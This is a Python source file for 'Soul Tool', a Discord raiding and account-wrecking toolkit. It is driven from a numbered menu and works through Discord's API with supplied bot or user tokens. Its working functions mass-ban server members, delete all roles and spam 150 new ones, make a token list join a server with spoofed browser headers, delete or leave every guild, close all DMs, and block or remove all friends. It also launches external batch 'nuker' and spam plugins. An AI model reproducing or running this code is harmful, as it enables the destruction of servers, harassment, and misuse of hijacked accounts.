import colorsys
import sys
import requests
import threading
import httpx
import asyncio
import json
from pystyle import *
import random
import os
import time
import base64
import ctypes
import disnake
import discord
from discord.ext import commands
from colorama import Fore



os.system("cls")
os.system('title Soul Tool - Made By .exe#1567')





def check(token):
    return httpx.get("https://discord.com/api/v9/users/@me",headers = {'authorization':f"Bot {token}"}).status_code


def check_guild(guild,token):
    return httpx.get(f"https://discord.com/api/v9/guilds/{guild}",headers = {'authorization':f"Bot {token}"}).status_code


def check_token(token):
    return httpx.get("https://discord.com/api/v9/users/@me",headers = {'authorization':f"{token}"}).status_code






 





def role():
    token = input("Bot Token : ")
    if check(token) in (200,201,204):
        guild = input("Guild ID: ")
        if check_guild(guild,token) in (200,201,204):
            channel_name =input("Roles Name: ")
            roles = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/roles",headers = {"authorization":f"Bot {token}"}).json()
            def create_roles():
                httpx.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers = {"authorization":f"Bot {token}"},json = {'name':channel_name,"color":random.randint(0,0xffffff)})
            def delete_roles():
                    httpx.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role['id']}",headers={"authorization":f"Bot {token}"})
            for role in roles:
                    try: 
                        threading.Thread(target=delete_roles).start()
                    except: pass
            for i in range(150):
                threading.Thread(target= create_roles).start()
            new_channels = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/channels",headers = {"authorization": f"Bot {token}"}).json()





def joiner():
        link = input(f"{Fore.MAGENTA}[{Fore.WHITE}+{Fore.MAGENTA}]{Fore.WHITE}Server link:")
        if len(link) > 8:
            invite = link[19:]
        else:
            invite = link
        apilink = f"https://discord.com/api/v9/invites/" + invite
        with open('tokens.txt','r') as handle:
            tokens = handle.readlines()
            for x in tokens:
                token = x.rstrip()
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
                    'Accept': '/',
                    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Content-Type': 'application/json',
                    'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
                    'Authorization': token,
                    'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
                    'X-Discord-Locale': 'en-US',
                    'X-Debug-Options': 'bugReporterEnabled',
                    'Origin': 'https://discord.com/',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://discord.com/',
                    'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'TE': 'trailers',
                    }
                requests.post(apilink, headers=headers, json = {})
                r = requests.get(apilink)
                if r.status_code == 200:
                    print(f"[+]{token} Joined succesfully \n")
                    
                else:
                    print(f"[-]{token} Failed to join \n")
                    os.system("cls")
                    menu()



def hypesquad():
    os.startfile("plugin3.bat")

def nickname():
    os.startfile("plugin8.bat")



def checker():
    os.startfile("plugin6.bat")



def vc_spammer():
    os.startfile("plugin4.bat")

def friend():
    os.startfile("plugin7.bat")



def webhook_tool():
    exec(open('Plugins/webhooktool.py').read())



def onliner():
    os.startfile("plugin5.bat")



 
def spammer():
    os.startfile("plugin2.bat")
       



def nuker():
     os.startfile("plugin1.bat")




    










    


def guild_deleter():
 token = input("Token: ")
 if check_token(token) in (200,201,204):
  headers = {'authorization':token}
  def get_user_guilds():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).text)
  def leaveguilds(guild_id):
    try:
        r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers, json={"lurking": False})
        if r.status_code == 429:
            a = r.json()
            time.sleep(a["retry_after"])
    except:
        pass
    try:
        r2 = requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers)
        if r2.status_code == 429:
            b = r2.json()
            time.sleep(b["retry_after"])
    except:
        pass
   
  for guild in get_user_guilds():
        threading.Thread(target=leaveguilds, args=(guild["id"],)).start()
  os.system("cls")
  menu()
 else: 
  os.system("cls")
  menu() 



def create_guild():
 token = input("Token: ")
 if check_token(token) in (200,201,204):
  headers = {'authorization':token}
  name = input("Guild Name: ")
  def createguilds():
    try:
        r = requests.post("https://discord.com/api/v9/guilds", headers=headers, json={"name": name})
        if r.status_code == 429:
            a = r.json()
            time.sleep(a["retry_after"])
    except:
        pass
  for i in range(100):
    threading.Thread(target=createguilds).start()
  os.system("cls")
  menu()
 else:
    os.system("cls")
    menu()

def block_friends():
 token = input("Token: ")
 if check_token(token) in (200,201,204):
   headers = {'authorization':token}
   def get_user_friends():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).text)
   def block(friend):
    httpx.put(f"https://discord.com/api/v9/users/@me/relationships/{friend}",headers = headers,json = {"type":2})
   for friend in get_user_friends():
     threading.Thread(target=block,args = (friend['id'],)).start()
   os.system("cls")
   menu()
 else:
    os.system("cls")
    menu()


def close_dms():
 token = input("Token: ")
 if check_token(token) in (200,201,204):
   headers = {'authorization':token}
   def get_user_private_channels(): 
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).text)
   def deletedms(channel_id):
     try:
        r2 = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
        if r2.status_code == 429:
            a = r2.json()
            time.sleep(a["retry_after"])
     except:
        pass
   for channel in get_user_private_channels():
    threading.Thread(target=deletedms,args=(channel['id'],)).start()
   os.system("cls")
   menu()
 else:
  os.system("cls")
  menu()


def remove_friends():
 token = input("Token: ")
 if check_token(token) in (200,201,204):
   headers = {'authorization':token}
   def get_user_friends():
    return json.loads(requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).text)
   def deletefriends(friend_id):
    try:
        r = requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend_id}", headers=headers)
        if r.status_code == 429:
            a = r.json()
            time.sleep(a["retry_after"])
    except:
        pass
    for friend in get_user_friends():
        threading.Thread(target=deletefriends, args=(friend["id"],)).start()
    os.system("cls")
    menu()
 else:
    os.system("cls")
    menu()

def massban():
    token = input("Bot Token: ")
    if check(token) in (200,201,204):
        guild = input("Server ID: ")
        if check_guild(guild,token) in (200,201,204): 
          members = httpx.get(f"https://discord.com/api/v9/guilds/{guild}/members?limit=1000",headers  = {"authorization":f"Bot {token}"}).json()
          def ban():
            httpx.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member['user']['id']}",headers={"authorization":f"Bot {token}"})
          for i in range(2):
           for member in members:
            threading.Thread(target=ban).start()
            os.system("cls")
            menu()






def banner():
    print("""
   ▄████████  ▄██████▄  ███    █▄   ▄█                ███      ▄██████▄   ▄██████▄   ▄█       
  ███    ███ ███    ███ ███    ███ ███            ▀█████████▄ ███    ███ ███    ███ ███       
  ███    █▀  ███    ███ ███    ███ ███               ▀███▀▀██ ███    ███ ███    ███ ███       
  ███        ███    ███ ███    ███ ███                ███   ▀ ███    ███ ███    ███ ███       
▀███████████ ███    ███ ███    ███ ███                ███     ███    ███ ███    ███ ███       
         ███ ███    ███ ███    ███ ███                ███     ███    ███ ███    ███ ███       
   ▄█    ███ ███    ███ ███    ███ ███▌    ▄          ███     ███    ███ ███    ███ ███▌    ▄ 
 ▄████████▀   ▀██████▀  ████████▀  █████▄▄██         ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██   
                                  Coded By .exe#1567                    """)
def menu():
    banner()
    print("""
──────────────────────────────────────────────────────────────────────────────────
[1]Nuker                 [7]Remove All Friend       [13]VC spammer
[2]Mass Ban              [8]Block All Friend        [14]Token Onliner
[3]Token Join            [9]Message Spam (Token)    [15]Friend Spam
[4]Guild Create          [10]Webhook Tool           [16]NickName Change
[5]Guild Delete          [11]Token Checker          [17]Delete And Create Role
[6]Close DMs             [12]HypeSquad Joiner       [18]Token Leaver
──────────────────────────────────────────────────────────────────────────────────""")
    choice = input("choice: ")



    if choice == "1":
        nuker()
        os.system("cls")
        menu()                          
    if choice == "2":
        massban()
        os.system("cls")
        menu()
    if choice == "3":
        joiner()
        os.system("cls")
        menu()
    if choice == "4":
        create_guild()
        os.system("cls")
        menu()
    elif choice == "5":
        guild_deleter()
        os.system("cls")
        menu()
    elif choice == "6":
        close_dms()
        os.system("cls")
        menu()
    elif choice == "7":
        remove_friends()
        os.system("cls")
        menu()
    elif choice == "8":
        block_friends()
        os.system("cls")
        menu()

    elif choice == "9":
        spammer()
        os.system("cls")
        menu()

    elif choice == "10":
        webhook_tool()
        os.system("cls")
        menu()
    elif choice == "11":
        checker()
        os.system("cls")
        menu()
    elif choice == "12":
        hypesquad()
        os.system("cls")
        menu()
    elif choice == "13":
        vc_spammer()
        os.system("cls")
        menu()
    elif choice == "14":
        onliner()
        os.system("cls")
        menu()
    elif choice == "15":
        friend()
        os.system("cls")
        menu()
    elif choice == "16":
        nickname()
        os.system("cls")
        menu()
    elif choice == "17":
        role()
        os.system("cls")
        menu()
    else:
        os.system("cls")
        menu()







    

menu()
